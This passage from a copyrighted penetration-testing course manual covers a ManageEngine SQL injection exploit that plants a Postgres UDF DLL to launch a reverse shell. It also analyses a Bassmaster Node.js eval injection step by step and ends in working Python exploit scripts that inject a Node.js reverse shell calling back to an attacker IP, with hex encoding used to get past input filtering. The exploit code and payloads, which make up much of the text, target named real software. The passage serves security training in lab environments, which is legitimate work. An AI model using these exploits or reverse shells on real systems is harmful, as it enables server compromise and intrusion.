There are a few small issues you will need to solve before you can remotely launch a reverse shell 
on the vulnerable ManageEngine server. Below you will find a proof of concept code that already 
implements most of the steps we discussed. You just need to put your payload in and fix up the 
“FIX ME” sections. 
import requests, sys, urllib, string, random, time 
requests.packages.urllib3.disable_warnings() 
 
# encoded UDF rev_shell dll 
udf ='YOUR DLL GOES HERE' 
loid = 1337 
 
def log(msg): 
   print msg 
 
def make_request(url, sql): 
   log("[*] Executing query: %s" % sql[0:80]) 
   r = requests.get( url % sql, verify=False) 
   return r 
 
def delete_lo(url, loid): 
   log("[+] Deleting existing LO...") 
   sql = "SELECT lo_unlink(%d)" % loid 
   make_request(url, sql) 
 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
170 
def create_lo(url, loid): 
   log("[+] Creating LO for UDF injection...") 
   sql = "SELECT lo_import($$C:\\windows\\win.ini$$,%d)" % loid 
   make_request(url, sql) 
    
def inject_udf(url, loid): 
   log("[+] Injecting payload of length %d into LO..." % len(udf)) 
   for i in range(0,((len(udf)-1)/--------FIX ME--------)+1): 
         udf_chunk = udf[i*--------FIX ME--------:(i+1)*--------FIX ME--------] 
         if i == 0: 
             sql = "UPDATE PG_LARGEOBJECT SET data=decode($$%s$$, $$--------FIX ME----
----$$) where loid=%d and pageno=%d" % (udf_chunk, loid, i) 
         else: 
             sql = "INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES (%d, %d, 
decode($$%s$$, $$--------FIX ME--------$$))" % (loid, i, udf_chunk) 
         make_request(url, sql) 
 
def export_udf(url, loid): 
   log("[+] Exporting UDF library to filesystem...") 
   sql = "SELECT lo_export(%d, $$C:\\Users\\Public\\rev_shell.dll$$)" % loid 
   make_request(url, sql) 
    
def create_udf_func(url): 
   log("[+] Creating function...") 
   sql = "create or replace function rev_shell(text, integer) returns VOID as 
$$C:\\Users\\Public\\rev_shell.dll$$, $$connect_back$$ language C strict" 
   make_request(url, sql) 
 
def trigger_udf(url, ip, port): 
   log("[+] Launching reverse shell...") 
   sql = "select rev_shell($$%s$$, %d)" % (ip, int(port)) 
   make_request(url, sql) 
    
if __name__ == '__main__': 
   try: 
       server = sys.argv[1].strip() 
       attacker = sys.argv[2].strip() 
       port = sys.argv[3].strip() 
   except IndexError: 
       print "[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0] 
       sys.exit() 
        
   sqli_url  = 
"https://"+server+"/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;%s;--"  
   delete_lo(sqli_url, loid)    
   create_lo(sqli_url, loid) 
   inject_udf(sqli_url, loid) 
   export_udf(sqli_url, loid) 
   create_udf_func(sqli_url) 
   trigger_udf(sqli_url, attacker, port) 
Listing 181 - UDF exercise proof-of-concept 
Although we do like our students to earn their shells the hard way, we will provide one hint: 
encoding matters! 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
171 
5.8.2.1 Exercise 
1. 
Fix the proof of concept script from Listing 181 and obtain a reverse shell. 
2. 
Explain why some encodings will not work. 
5.8.2.2 Extra Mile 
Use the SQL injection we discovered in this module to create a large object and retrieve the 
assigned LOID without the use of blind injection. Adapt your final proof of concept accordingly in 
order to employ this technique avoiding the use of a pre set LOID value (1337). 
5.9 Summary 
In this module we have demonstrated how to discover an unauthenticated SQL injection 
vulnerability using source code audit in a Java-based web application. 
We then showed how to use time-based blind SQL injection payloads along with stack queries in 
order to exfiltrate database information. 
Finally, we developed an exploit that utilized Postgres User Defined Functions and Large Objects 
to gain a fully functional reverse shell. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
172 
5.9.1.1.1 
 
6 Bassmaster NodeJS Arbitrary JavaScript Injection 
Vulnerability 
This module will cover the in-depth analysis and exploitation of a code injection vulnerability 
identified in the Bassmaster plugin that can be used to gain access to the underlying operating 
system. We will also discuss ways in which you can audit server-side JavaScript code for critical 
vulnerabilities such as these. 
6.1 Getting Started 
Revert the Bassmaster virtual machine from your student control panel. Please refer to the Wiki 
for the Bassmaster box credentials. 
To start the NodeJS web server we’ll login to the Bassmaster VM via ssh and issue the following 
command from the terminal: 
student@bassmaster:~$ cd bassmaster/ 
 
student@bassmaster:~/bassmaster$ nodejs examples/batch.js 
Server started. 
Listing 182 - Starting the NodeJS server. 
When the server starts up, an endpoint will be made available at the following URL:   
http://bassmaster:8080/request 
Listing 183 - Bassmaster URL 
6.2 The Bassmaster Plugin 
In recent years our online experiences have, for better or worse, evolved with the advent of 
various JavaScript frameworks and libraries built to run on top of Node.js.60 As described by its 
developers, Node.js is “…an asynchronous event driven JavaScript runtime…”, which means that it 
is capable of handling multiple requests, without the use of “thread-based networking”.61 We 
encourage you to read more about Node.js, but for the purposes of this module, we are interested 
in a plugin called Bassmaster62 that was developed for the hapi63 framework, which runs on 
Node.js. 
In essence, Bassmaster is a batch processing plugin that can combine multiple requests into a 
single one and pass them on for further processing. The version of the plugin installed on your 
virtual machine is vulnerable to JavaScript code injection, which results in server-side remote 
code execution. 
 
60 (OpenJS Foundation, 2020), https://nodejs.org/en/ 
61 (OpenJS Foundation, 2020), https://nodejs.org/en/about/ 
62 (Eran Hammer, 2018), https://github.com/hapijs/bassmaster 
63 (Sideway Inc., 2020), https://hapijs.com/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
173 
Although modern web application scanners can detect a wide variety of vulnerabilities with 
escalating complexity, Node.js-based applications still present a somewhat difficult vulnerability 
discovery challenge. Nevertheless, in the example we will discuss in this module, we are able to 
audit the source code, which will help us discover and analyze a critical remote code execution 
vulnerability as well as sharpen our code auditing skills. 
The most interesting aspect of this particular vulnerability is that it directly leads to server-side 
code execution. In a more typical situation, JavaScript code injections are usually found on the 
client-side attack surface and involve arguably less critical vulnerability classes such as Cross-
Site Scripting. 
6.3 Vulnerability Discovery 
Given the fact that Bassmaster is designed as a server-side plugin and that we have access to the 
source code, one of the first things we want to do is parse the code for any low-hanging fruit. In 
the case of JavaScript, a search for the eval64 function should be on top of that list, as it allows 
the user to execute arbitrary code. If eval is available AND reachable with user-controlled input, 
that could lead to remote code execution. 
With the above in mind, let’s determine what we are dealing with. 
student@bassmaster:~/bassmaster$ grep -rnw  "eval(" . --color 
./lib/batch.js:152:                    eval('value = ref.' + parts[i].value + ';'); 
./node_modules/sinon/lib/sinon/spy.js:77:                eval("p = (function proxy(" + 
vars.substring(0, proxyLength * 2 - 1) + // eslint-disable-line no-eval 
./node_modules/sinon/pkg/sinon-1.17.6.js:2543:                eval("p = (function 
proxy(" + vars.substring(0, proxyLength * 2 - 1) + // eslint-disable-line no-eval 
./node_modules/sinon/pkg/sinon.js:2543:                eval("p = (function proxy(" + 
vars.substring(0, proxyLength * 2 - 1) + // eslint-disable-line no-eval 
./node_modules/lab/node_modules/esprima/test/test.js:17210:        'function eval() { 
}': { 
... 
student@bassmaster:~/bassmaster$ 
Listing 184 - Searching the Bassmaster code base for the use of eval() function 
In Listing 184, the very first result points us to the lib/batch.js file, which looks like a very good 
spot to begin our investigation. 
Beginning on line 137 of lib/batch.js, we find the implementation of a function called 
internals.batch that accepts a parameter called parts, among others. This parameter array is then 
used in the eval function call on line 152. 
137: internals.batch = function (batchRequest, resultsData, pos, parts, callback) { 
138:  
139:     var path = ''; 
140:     var error = null; 
141:  
142:     for (var i = 0, il = parts.length; i < il; ++i) { 
143:         path += '/'; 
144:  
 
64 (Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
174 
145:         if (parts[i].type === 'ref') { 
146:             var ref = resultsData.resultsMap[parts[i].index]; 
147:  
148:             if (ref) { 
149:                 var value = null; 
150:  
151:                 try { 
152:                     eval('value = ref.' + parts[i].value + ';'); 
153:                 } 
Listing 185 - An instance of the eval() function usage in batch.js 
In order to reach that point, we need to make sure that the type of at least one of the parts array 
entries is “ref”. Notice that if there is no entry of type “ref”, we will drop down to the if statement on 
line 182, which we should pass as the error variable is initialized to null. This in turn leads us to 
the internals.dispatch function on line 186. We won’t show the implementation of this function 
since it simply makes another HTTP request on our behalf, which should pull the next request 
from the initial batch, but we encourage you to see that for yourself in the source code. 
154:                 catch (e) { 
155:                     error = new Error(e.message); 
156:                 } 
157:  
158:                 if (value) { 
159:                     if (value.match && value.match(/^[\w:]+$/)) { 
160:                         path += value; 
161:                     } 
162:                     else { 
163:                         error = new Error('Reference value includes illegal 
characters'); 
164:                         break; 
165:                     } 
166:                 } 
167:                 else { 
168:                     error = error || new Error('Reference not found'); 
169:                     break; 
170:                 } 
171:             } 
172:             else { 
173:                 error = new Error('Missing reference response'); 
174:                 break; 
175:             } 
176:         } 
177:         else { 
178:             path += parts[i].value; 
179:         } 
180:     } 
181:  
182:     if (error === null) { 
183:  
184:         // Make request 
185:         batchRequest.payload.requests[pos].path = path; 
186:         internals.dispatch(batchRequest, batchRequest.payload.requests[pos], 
function (data) { 
Listing 186 - Internals.dispatch performs additional HTTP requests on our behalf 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
175 
The important part is on lines 194-195 or 202-203, where the resultsData array entries get 
populated based on the HTTP response from the previous request. Ultimately, this will allow us to 
pass the check for “ref” on line 148, which is based on data from the resultsData array, and we will 
arrive at our target, back on line 152 where the eval is performed. 
187:  
188:             // If redirection 
189:             if (('' + data.statusCode).indexOf('3')  === 0) { 
190:                 batchRequest.payload.requests[pos].path = data.headers.location; 
191:                 internals.dispatch(batchRequest, 
batchRequest.payload.requests[pos], function (data) { 
192:                     var result = data.result; 
193:  
194:                     resultsData.results[pos] = result; 
195:                     resultsData.resultsMap[pos] = result; 
196:                     callback(null, result); 
197:                 }); 
198:                 return; 
199:             } 
200:  
201:             var result = data.result; 
202:             resultsData.results[pos] = result; 
203:             resultsData.resultsMap[pos] = result; 
204:             callback(null, result); 
205:         }); 
206:     } 
207:     else { 
208:         resultsData.results[pos] = error; 
209:         return callback(error); 
210:     } 
211: }; 
Listing 187 - resultsData array is populated with the HTTP request results 
Since eval executes the code passed as a string parameter, its use is highly discouraged when the 
input is user-controlled. Notice that in this case, the eval function executes code that is composed 
of hardcoded strings as well as the parts array entries. This looks like a promising lead, so we 
need to trace back the code execution path and see if we control the contents of the parts array 
at any point. 
Looking through the rest of the lib/batch.js file, we find that our internals.batch function is called 
on line 88 (Listing 188) from the internal.process function that has a couple of relevant parts we 
need to highlight. 
First of all, a callback function called callBatch is defined on line 85 and makes a call to the 
internals.batch function on line 88. Notice that the second argument of the callBatch function 
(called parts) is simply passed to the internals.batch function as the fourth argument. This is the 
one we can hopefully control, so we need to keep a track of it. 
081: internals.process = function (request, requests, resultsData, reply) { 
082:  
083:     var fnsParallel = []; 
084:     var fnsSerial = []; 
085:     var callBatch = function (pos, parts) { 
086:  
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
176 
087:         return function (callback) { 
088:             internals.batch(request, resultsData, pos, parts, callback); 
089:         }; 
090:     }; 
Listing 188 - The process function 
Then on lines 92-101, we see the arrays fnsParallel and fnsSerial populated with the callBatch 
function. Finally, these arrays are passed on to the Async.series function starting on line 103, 
where they will trigger the execution of the callBatch function. 
091:  
092:     for (var i = 0, il = requests.length; i < il; ++i) { 
093:         var parts = requests[i]; 
094:  
095:         if (internals.hasRefPart(parts)) { 
096:             fnsSerial.push(callBatch(i, parts)); 
097:         } 
098:         else { 
099:             fnsParallel.push(callBatch(i, parts)); 
100:         } 
101:     } 
102:  
103:     Async.series([ 
104:         function (callback) { 
105:  
106:             Async.parallel(fnsParallel, callback); 
107:         }, 
108:         function (callback) { 
109:  
110:             Async.series(fnsSerial, callback); 
111:         } 
112:     ], function (err) { 
113:  
114:         if (err) { 
115:             reply(err); 
116:         } 
117:         else { 
118:             reply(resultsData.results); 
119:         } 
120:     }); 
121: }; 
Listing 189 - The remainder of the process function 
The most important part of this logic to understand is that the callBatch function calls on lines 96 
and 99 use a variable called parts that is populated from the requests array, which is passed to 
the internals.process function as the second argument. This is now the argument we need to 
continue keeping track of. 
The next step in our tracing exercise is to find out where the internals.process function is called 
from. Once again, if we look through the lib/batch.js file, we can find the function call we are 
looking for on line 69. 
12: module.exports.config = function (settings) { 
13:  
14:     return { 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
177 
15:         handler: function (request, reply) { 
16:  
17:             var resultsData = { 
18:                 results: [], 
19:                 resultsMap: [] 
20:             }; 
21:  
22:             var requests = []; 
23:             var requestRegex = /(?:\/)(?:\$(\d)+\.)?([^\/\$]*)/g;       // 
/project/$1.project/tasks, does not allow using array responses 
24:  
25:             // Validate requests 
26:  
27:             var errorMessage = null; 
28:             var parseRequest = function ($0, $1, $2) { 
29:  
30:                 if ($1) { 
31:                     if ($1 < i) { 
32:                         parts.push({ type: 'ref', index: $1, value: $2 }); 
33:                         return ''; 
34:                     } 
35:                     else { 
36:                         errorMessage = 'Request reference is beyond array size: ' 
+ i; 
37:                         return $0; 
38:                     } 
39:                 } 
40:                 else { 
41:                     parts.push({ type: 'text', value: $2 }); 
42:                     return ''; 
43:                 } 
44:             }; 
45:  
46:             if (!request.payload.requests) { 
47:                 return reply(Boom.badRequest('Request missing requests array')); 
48:             } 
49:  
50:             for (var i = 0, il = request.payload.requests.length; i < il; ++i) { 
51:  
52:                 // Break into parts 
53:  
54:                 var parts = []; 
55:                 var result = 
request.payload.requests[i].path.replace(requestRegex, parseRequest); 
56:  
57:                 // Make sure entire string was processed (empty) 
58:  
59:                 if (result === '') { 
60:                     requests.push(parts); 
61:                 } 
62:                 else { 
63:                     errorMessage = errorMessage || 'Invalid request format in 
item: ' + i; 
64:                     break; 
65:                 } 
66:             } 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
178 
67:  
68:             if (errorMessage === null) { 
69:                 internals.process(request, requests, resultsData, reply); 
70:             } 
71:             else { 
72:                 reply(Boom.badRequest(errorMessage)); 
73:             } 
74:         }, 
75:         description: settings.description, 
76:         tags: settings.tags 
77:     }; 
78: }; 
Listing 190 - Batch.config function 
We will start analyzing the code listed above from the beginning and see how we can reach our 
internals.process function call. First, the resultsData hash map is set with results and resultsMap 
as arrays within the map (line 17). Following that, the URL path part of a requests array entry in 
the request variable is parsed and split into parts (line 55) after being processed using the regular 
expression that is defined on line 23. This is an important restriction we will need to deal with. 
The code execution logic in this case is somewhat difficult to follow if you are not familiar with 
JavaScript, so we will break it down even more. Specifically, the string replace function in 
JavaScript can accept a regular expression as the first parameter and a function as the second. 
In that case, the string on which the replace function is operating (in this instance a part of the 
URL path), will first be processed through the regular expression. As a result, this operation 
returns a number of parameters, which are then passed to the function that was passed as the 
second parameter. Finally, the function itself executes and the code execution proceeds in a more 
clear manner. If this explanation still leaves you scratching your head, we recommend that you 
read the String.prototype.replace documentation.65 
Notice that the parseRequest function is ultimately responsible for setting the part type to “ref”, 
which is what we will need to reach our eval instance as we previously described. As a result of 
the implemented logic, the parts array defined on line 54 is populated in the parseRequest 
function on lines 32 and 41. Ultimately, the parts array becomes an entry in the requests array on 
line 60. If no errors occur during this step, the internals.process function is called with the 
requests variable passed as the second parameter. 
The analysis of this code chunk shows us that if we can control the URL paths that are passed to 
lib/batch.js for processing, we should be able to reach our eval function call with user-controlled 
data. But first, we need to find out where the module.exports.config function that we looked at in 
Listing 190 is called from. That search leads us to the lib/index.js file. 
01:  // Load modules 
02:  
03: var Hoek = require('hoek'); 
04: var Batch = require('./batch'); 
05:  
06:  
07: // Declare internals 
 
65 (Mozilla, 2020), https://developer.mozilla.org/en-
US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#Specifying_a_function_as_a_parameter 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
179 
08:  
09: var internals = { 
10:     defaults: { 
11:         batchEndpoint: '/batch', 
12:         description: 'A batch endpoint that makes it easy to combine multiple 
requests to other endpoints in a single call.', 
13:         tags: ['bassmaster'] 
14:     } 
15: }; 
16:  
17:  
18: exports.register = function (pack, options, next) { 
19:  
20:     var settings = Hoek.applyToDefaults(internals.defaults, options); 
21:  
22:     pack.route({ 
23:         method: 'POST', 
24:         path: settings.batchEndpoint, 
25:         config: Batch.config(settings) 
26:     }); 
27:  
28:     next(); 
29: }; 
Listing 191 - The /batch endpoint defined in lib/index.js 
The source code in the listing above shows that the /batch endpoint handles requests through the 
config function defined in the bassmaster/lib/batch.js file. This means that properly formatted 
requests made to this endpoint will eventually reach our eval target! 
So how do we create a properly formatted request for this endpoint? Fortunately, the Bassmaster 
plugin comes with an example file (examples/batch.js) that tells us exactly what we need to know. 
11: /** 
12:  * To Test: 
13:  * 
14:  * Run the server and try a batch request like the following: 
15:  * 
16:  * POST /batch 
17:  *     { "requests": [{ "method": "get", "path": "/profile" }, { "method": "get", 
"path": "/item" }, { "method": "get", "path": "/item/$1.id" }] 
18:  * 
19:  * or a GET request to http://localhost:8080/request will perform the above 
request for you 
20:  */ 
21:  
... 
49:  
50: internals.requestBatch = function (request, reply) { 
51:  
52:     internals.http.inject({ 
53:         method: 'POST', 
54:         url: '/batch', 
55:         payload: '{ "requests": [{ "method": "get", "path": "/profile" }, { 
"method": "get", "path": "/item" }, { "method": "get", "path": "/item/$1.id" }] }' 
56:     }, function (res) { 
57:  
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
180 
58:         reply(res.result); 
59:     }); 
60: }; 
61:  
62:  
63: internals.main = function () { 
64:  
65:     internals.http = new Hapi.Server(8080); 
66:  
67:     internals.http.route([ 
68:         { method: 'GET', path: '/profile', handler: internals.profile }, 
69:         { method: 'GET', path: '/item', handler: internals.activeItem }, 
70:         { method: 'GET', path: '/item/{id}', handler: internals.item }, 
71:         { method: 'GET', path: '/request', handler: internals.requestBatch } 
72:     ]); 
73:  
Listing 192 - Bassmaster example code 
Specifically, we can see in the listing above that the example code clearly defines two ways to 
reach the batch processing function. The first one is an indirect path through a GET request to the 
/request route, as seen on lines 71. The second one is a direct JSON66 POST request to the /batch 
internal endpoint on line 53. 
With that said, we can use the following simple Python script to send an exact copy of the 
example request: 
import requests,sys 
 
if len(sys.argv) != 2: 
    print "(+) usage: %s <target>" % sys.argv[0] 
    sys.exit(-1) 
     
target = "http://%s:8080/batch" % sys.argv[1] 
 
request_1 = '{"method":"get","path":"/profile"}' 
request_2 = '{"method":"get","path":"/item"}' 
request_3 = '{"method":"get","path":"/item/$1.id"}' 
 
json =  '{"requests":[%s,%s,%s]}' % (request_1, request_2, request_3) 
 
r = requests.post(target, json) 
 
print r.text 
Listing 193 - A script to send the request based on the comments in ~/bassmaster/examples/batch.js 
Once we start the Node.js runtime with the bassmaster example file, we can execute our script. If 
everything is working as expected, we should receive a response like the following: 
kali@kali:~/bassmaster$ python bassmaster_valid.py bassmaster 
[{"id":"fa0dbda9b1b","name":"John Doe"},{"id":"55cf687663","name":"Active 
Item"},{"id":"55cf687663","name":"Item"}] 
Listing 194 - The expected response to a valid POST submission to /batch on the bassmaster server 
 
66 (The JSON Data Interchange Standard, 2020), https://www.json.org/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
181 
At this point, we can start thinking about how our malicious request should look in order to reach 
the eval function we are targeting. 
6.4 Triggering the Vulnerability 
It turns out that the only “sanitization” on our JSON request is done through the regular 
expression we mentioned in the previous section that checks for a valid item format. As a quick 
reminder, the regular expression looks like this: 
/(?:\/)(?:\$(\d)+\.)?([^\/\$]*)/g 
Listing 195 - The regular expression to match 
An easy way to decipher and understand regular expressions is to use one of the few public 
websites67 that provide a regular expression testing environment. In this case, we will use a 
known valid string from our original payload with a small modification. 
 
Figure 123: Finding a string that will match the second group 
As we can see, the forward slashes are essentially used as a string separator and the strings 
between the slashes are then grouped using the dot character as a separator, but only if the $d. 
pattern is matched. 
In Figure 123, we attempted to inject the string “;hacked” into the original payload and managed to 
pass the regular expression test. Since the “;” character terminates a statement in JavaScript, we 
should now be able to append code to the original instruction and see if we can execute it! As a 
proof of concept, we can use the NodeJS util module’s log method to write a message to the 
console.68 First, let’s double check that this would work with our regular expression. 
 
67 (Regex 101, 2020), https://regex101.com/ 
68 (OpenJS Foundation, 2020), https://nodejs.org/api/util.html#util_util_log_string 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
182 
 
Figure 124: The payload works with the regular expression 
In Figure 124 our entire payload is grouped within Group 2, which means that we should reach the 
eval function and our payload should execute. Let’s add this to our script and see if we get any 
output. 
The following proof of concept can do that for us. It builds the JSON payload and appends the 
code of our choice to the last request entry. 
import requests,sys 
 
if len(sys.argv) != 3: 
    print "(+) usage: %s <target> <cmd_injection>" % sys.argv[0] 
    sys.exit(-1) 
     
target = "http://%s:8080/batch" % sys.argv[1] 
 
cmd = sys.argv[2] 
 
request_1 = '{"method":"get","path":"/profile"}' 
request_2 = '{"method":"get","path":"/item"}' 
request_3 = '{"method":"get","path":"/item/$1.id;%s"}' % cmd 
 
json =  '{"requests":[%s,%s,%s]}' % (request_1, request_2, request_3) 
 
r = requests.post(target, json) 
 
print r.content 
Listing 196 - Proof of concept that injects JavaScript code into the server-side eval instruction 
In the following instance, we are going to use a simple log function as our payload and try to get it 
to execute on our target server. 
kali@kali:~/bassmaster$ python bassmaster_cmd.py bassmaster 
"require('util').log('CODE_EXECUTION');" 
[{"id":"fa0dbda9b1b","name":"John Doe"},{"id":"55cf687663","name":"Active 
Item"},{"id":"55cf687663","name":"Item"}] 
Listing 197 - Injecting Javascript code 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
183 
 
Figure 125: Our web console shows that we have been hacked! 
Great! As shown in Figure 125 we can execute arbitrary JavaScript code on the server. Notice that 
the regular expression is not really sanitizing the input. It is simply making sure that the format of 
the user-provided URL path is correct. 
A log message isn’t exactly our goal though. Ideally, we want to get a remote shell on the server. 
So let’s see if we can take our attack that far. 
6.5 Obtaining a Reverse Shell 
Now that we have demonstrated how to remotely execute arbitrary code using this Bassmaster 
vulnerability, we only need to inject a Javascript reverse shell into our JSON payload to wrap up 
our attack. However, there is one small problem we will need to deal with. Let’s first take a look at 
the following Node.js reverse shell that can be found online:69 
var net = require("net"), sh = require("child_process").exec("/bin/bash"); 
var client = new net.Socket(); 
client.connect(80, "attackerip", 
function(){client.pipe(sh.stdin);sh.stdout.pipe(client); 
sh.stderr.pipe(client);}); 
Listing 198 - Node.js reverse shell 
While the code in the listing above is more or less self-explanatory in that it redirects the input and 
output streams to the established socket, the only item worth pointing out is that it is doing so 
using the Node.js net module. 
We update our previous proof of concept by including the reverse shell from Listing 198. The 
code accepts an IP address and a port as command line arguments to properly set up a network 
connection between the server and the attacking machine. 
import requests,sys 
 
if len(sys.argv) != 4: 
    print "(+) usage: %s <target> <attacking ip address> <attacking port>" % 
sys.argv[0] 
    sys.exit(-1) 
     
target = "http://%s:8080/batch" % sys.argv[1] 
 
cmd = "//bin//bash" 
 
attackerip = sys.argv[2] 
attackerport = sys.argv[3] 
 
request_1 = '{"method":"get","path":"/profile"}' 
 
69 (Riyaz Walikar, 2016), https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
184 
request_2 = '{"method":"get","path":"/item"}' 
 
shell = 'var net = require(\'net\'),sh = require(\'child_process\').exec(\'%s\'); ' % 
cmd 
shell += 'var client = new net.Socket(); ' 
shell += 'client.connect(%s, \'%s\', function() 
{client.pipe(sh.stdin);sh.stdout.pipe(client);' % (attackerport, attackerip) 
shell += 'sh.stderr.pipe(client);});'  
 
request_3 = '{"method":"get","path":"/item/$1.id;%s"}' % shell 
 
json =  '{"requests":[%s,%s,%s]}' % (request_1, request_2, request_3) 
 
r = requests.post(target, json) 
 
print r.content 
Listing 199 - Proof of concept reverse shell script 
If we execute this script after setting up a netcat listener on our Kali VM, we should receive a 
reverse shell. However, the following listing shows that this does not happen. 
kali@kali:~/bassmaster$ python bassmaster_shell.py bassmaster 192.168.119.120 5555 
{"statusCode":500,"error":"Internal Server Error","message":"An internal server error 
occurred"} 
Listing 200 - Initial attempt to gain a reverse shell fails 
Since our exploit has clearly failed, we need to figure out where things went wrong. To do that, we 
can slightly modify the lib/batch.js file on the target server and add a single debugging statement 
right before the eval function call. Specifically, we want to see what exactly is being passed to the 
eval function for execution. The new code should look like this: 
... 
            if (ref) { 
                var value = null; 
 
                try { 
                    console.log('Executing: ' + parts[i].value); 
                    eval('value = ref.' + parts[i].value + ';'); 
                } 
                catch (e) { 
... 
Listing 201 - Debugging code execution 
If we now execute our reverse shellcode injection script, we can see the following output in the 
server terminal window: 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
185 
 
Figure 126: Debugging a failed attempt to get a reverse shell 
That certainly does not look like our complete code injection! It appears that our payload is 
getting truncated at the first forward slash. However, if you recall how the regular expression that 
filters our input works, this result actually makes sense. Let’s submit our whole payload to the 
regex checker and see how exactly the parsing takes place. 
 
Figure 127: Regex checker ran against the Node.js reverse shell 
We can clearly see that the regular expression is explicitly looking for the forward slashes and 
groups the input accordingly. Again, this makes sense as the inputs the Bassmaster plugin 
expects are actually URL paths. 
Since our payload contains forward slashes (“/bin/bash”) it gets truncated by the regex. This 
means that we need to figure out how to overcome this character restriction. Fortunately, 
JavaScript strings can by design be composed of hex-encoded characters, in addition to other 
encodings. So we should be able to hex-encode our forward slashes and bypass the restrictions 
of the regex parsing. The following proof of concepts applies the hex-encoding scheme to the 
cmd string. 
import requests,sys 
 
if len(sys.argv) != 4: 
    print "(+) usage: %s <target> <attacking ip address> <attacking port>" % 
sys.argv[0] 
    sys.exit(-1) 
     
target = "http://%s:8080/batch" % sys.argv[1] 
 
cmd = "\\\\x2fbin\\\\x2fbash" 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
186 
 
attackerip = sys.argv[2] 
attackerport = sys.argv[3] 
 
request_1 = '{"method":"get","path":"/profile"}' 
request_2 = '{"method":"get","path":"/item"}' 
 
shell = 'var net = require(\'net\'),sh = require(\'child_process\').exec(\'%s\'); ' % 
cmd 
shell += 'var client = new net.Socket(); ' 
shell += 'client.connect(%s, \'%s\', function() 
{client.pipe(sh.stdin);sh.stdout.pipe(client);' % (attackerport, attackerip) 
shell += 'sh.stderr.pipe(client);});'  
 
request_3 = '{"method":"get","path":"/item/$1.id;%s"}' % shell 
 
json =  '{"requests":[%s,%s,%s]}' % (request_1, request_2, request_3) 
 
r = requests.post(target, json) 
 
print r.content 
Listing 202 - Avoiding character restrictions via hex encoding 
All that is left to do now is test our new payload. We’ll set up the netcat listener on our Kali VM 
and pass the IP and port as arguments to our script. 
 
Figure 128: Bassmaster code injection results in a reverse shell 
Excellent! Our character restriction evasion worked and we were able to receive a reverse shell! 
6.5.1.1 Exercise 
Repeat the steps outlined in this module and obtain a reverse shell. 
6.5.1.2 Extra Mile 
The student user home directory contains a sub-directory named bassmaster_extramile. In this 
directory we slightly modified the Bassmaster original code to harden the exploitation of the 
vulnerability covered in this module. 
Launch the NodeJS batch.js example server from the extra mile directory and exploit the eval 
code injection vulnerability overcoming the new restrictions in place. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
187 
student@bassmaster:~$ cd bassmaster_extramile/ 
 
student@bassmaster:~/bassmaster_extramile$ nodejs examples/batch.js 
Server started. 
Listing 203 - Starting the extra mile NodeJS server 
6.6 Wrapping Up 
In this module we analyzed a remote code injection vulnerability in the Bassmaster plugin by 
performing a thorough review of its source code. During this process, we encountered regex and 
character restrictions, which we were able to bypass without much trouble. Ultimately, we 
demonstrated that the JavaScript eval function should be used with great care and that user-
controlled input should never be able to reach it, as it can lead to a compromise of the vulnerable 
system. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
188 
6.6.1.1.1 
 
7 DotNetNuke Cookie Deserialization RCE 
This module will cover the in-depth analysis and exploitation of a deserialization remote code 
execution vulnerability in the DotNetNuke (DNN) platform through the use of maliciously crafted 
cookies. The primary focus of the module will be directed at the .Net deserialization process, and 
more specifically at the XMLSerializer class. 
